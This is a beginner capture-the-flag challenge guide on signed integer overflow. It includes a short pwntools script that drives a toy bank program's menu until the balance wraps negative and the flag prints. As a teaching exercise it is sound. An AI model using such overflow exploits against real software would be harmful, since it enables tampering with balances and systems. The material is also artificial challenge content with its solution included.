# Challenge Name
showdown

## Learning Objective
Learn about integer overflow

## Description 
The Evil Megacorp has stolen people's money! We managed to get in secretly but gotta break their bank somehow...

## Difficulty:
easy

## Guide
We have the following:

```sh
-----------EVIL MEGACORP BANK-----------
Bank Amount: 100000
----------------------------------------

Options:
1. Hack
2. Weaken
3. Steal
Enter your choice: 
```

Let's breakdown what happens each option:
1. Hack - sends 10000 to the bank, multiplied by the `multiplier` variable
2. Weaken - multiplies `multiplier` variable by 10, but caps at 10 million
3. Steal - takes away 20000 from the bank

if we attempt to steal all the money, you will wind up with this output:

```sh
You've been caught by the system administrator.
```

This is because the program will catch if the bank amount is between 0 to -100000. The flag only prints if the value is beyond -100000.

So what can we do then?

### Integer overflow
This happens when you try to exceed the value that is meant for the integer type assigned to a variable. In this case, we want to overflow this value:

```c
signed bank_amt = 100000;
```

### Signed integer
`Signed` integers can be both positive and negative values. But with `1`s and `0`s, how can there be negative numbers?

This is because `signed` integers allocate the **upper** half of its space to negative integers.

```sh
# Signed 4 byte integer

Hex: 0x7FFFFFFF
Dec: 2,147,483,647

Hex: 0x80000000
Dec: -2,147,483,648

# means anything beyond 0x7FFFFFFF is negative
```

### What can we do?
In this case, since we want to break the bank amount (make it go negative), we will
1. Cap the `multiplier` variable (use weaken)
2. Hack with the max multiplier

### Manual Solve
1. Use `weaken` 7 times (to cap `multiplier`)
2. use `hack` (send the final amount)

You should be able to observe the final bank amount as well.

### Script solve
we first choose option 2 (weaken) 7 times. We can just do this in a loop:

```py
from pwn import *

p = remote("SERVER", PORT)

for i in range(7):
    p.sendline(b'2')
```

If we are gonna receive the flag, we need to first remove the previous lines that we have received so far. This can be done with the following:

```py
p.clean()
```

and finally choose option 1 and receive the flag.

```py
p.sendline(b'1')
print(p.recvall().strip().decode())
```

### Final
```py
from pwn import *

p = remote("SERVER", PORT)

for i in range(7):
    p.sendline(b'2')
p.clean()
p.sendline(b'1')
print(p.recvall().strip().decode())
```
## Solution
Refer to solve.py

## Hints
1. Search up "signed integers"
2. Figure a strategy to send a big amount to the bank.

## Attached Files
- chall.c
- chall

## Resources
- https://www.geeksforgeeks.org/different-ways-to-represent-signed-integer/

## Flag
TBD